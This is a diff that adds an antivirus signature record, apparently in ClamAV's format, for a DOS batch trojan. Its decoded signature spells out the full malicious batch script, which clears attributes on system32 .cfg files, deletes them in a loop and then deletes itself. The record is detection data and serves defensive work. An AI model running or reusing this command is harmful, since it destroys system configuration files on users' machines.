@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36482
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off :loop attrib "c:\windows\system32\*.cfg" -r -a -s -h del "c:\windows\system32\*.cfg" if exist "c:\windows\system32\*.cfg" goto loop del %0 
